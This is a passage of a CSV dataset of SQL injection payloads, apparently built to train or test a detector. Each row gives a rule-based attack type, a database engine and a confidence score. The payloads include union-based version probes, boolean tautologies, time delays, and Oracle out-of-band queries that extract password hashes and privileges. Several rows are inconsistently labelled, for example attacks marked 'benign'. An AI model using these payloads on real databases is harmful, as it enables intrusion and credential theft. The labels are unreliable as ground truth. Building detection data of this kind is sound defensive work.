row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
390,"select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
391,"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
392,"admin""or 1 = 1 or """" = """,1,,boolean_blind,generic,0.95,"or 1 = 1, 1 = 1 or detected — boolean_blind injection (priority 8) on generic",rule-based
393,uni on sel ect,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
394,""" or """"&""",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
395,) ) ;waitfor delay '0:0:__TIME__'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
396,"select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
397,1 waitfor delay '0:0:10'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
398,bfilename,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
399,admin' ) or ( '1' = '1'--,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
400,UEf,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
401,1 or sleep ( __TIME__ ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
402,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
403,"select * from users where id = '1' union select $[""],@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
404,"select * from users where id = '1' + @ ( 1 ) union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ ( 1 ) union select detected — union_based injection (priority 7) on generic",rule-based
405,1' and 1 = ( select count ( * ) from tablenames ) ; --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
406,or sleep ( __TIME__ ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
407,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
408,"select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
409,||6,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
410,or 1/*,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
411,"and 1 = ( if ( ( load_file ( char ( 110,46,101,120,116 ) ) <>char ( 39,39 ) ) ,1,0 ) ) ;",1,,out_of_band,mysql,0.95,load_file ( detected — out_of_band injection (priority 2) on mysql,rule-based
412,select * from users where id = 1.%@ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
413,"select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
414,"select * from users where id = 1 or 1&@# = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @# = 1 union select detected — union_based injection (priority 7) on generic",rule-based
415,"select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
416,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
417,select * from users where id = 1 or $<\. or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
418,"select * from users where id = 1 * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
419,or 'whatever' in ( 'whatever' ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
